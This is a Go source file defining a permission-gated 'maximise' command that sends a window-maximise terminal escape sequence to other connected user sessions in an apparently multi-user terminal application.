package subcommands

import (
	"Nosviak4/source/masters/commands"
	reg "Nosviak4/source/masters/commands/commands"
	"Nosviak4/source/masters/sessions"
	"Nosviak4/source/masters/terminal/interactions"

)

var SessionsMaximise = reg.Sessions.NewCommand(&commands.Command{
	Aliases:     []string{"maximise"},
	Description: "maximise a session",
	Permissions: []string{interactions.ADMIN, interactions.MOD},
	CommandFunc: func(ac *commands.ArgContext, session *sessions.Session) error {
		recv := make([]*sessions.Session, 0)
		for _, value := range ac.Args[0].Values {
			targets := sessions.IndexSessions(value.ToString())
			if len(targets) == 0 {
				return session.ExecuteBranding(make(map[string]any), "commands", "sessions", "no_receivers.tfx")
			}

			recv = append(recv, targets...)
		}

		if session.Included(recv) {
			return session.ExecuteBranding(make(map[string]any), "commands", "sessions", "selfaction_denied.tfx")
		}

		// Writes the alert using the PostAlert function to all sessions included
		sessions.WriteToSession(recv, func(index *sessions.Session) {
			index.Terminal.Write([]byte("\x1b[9;2;0t"))
		})

		return session.ExecuteBranding(make(map[string]any), "commands", "sessions", "session_maximised.tfx")
	},

	/* params for the command */
	Args: []*commands.Arg{{
			Name: "id",
			Type: commands.STRING,
			OpenEnded: true,
			Callback: func(ac *commands.ArgContext, s *sessions.Session, i int) []string {
				return s.Callback()
			},
		},
	},
})
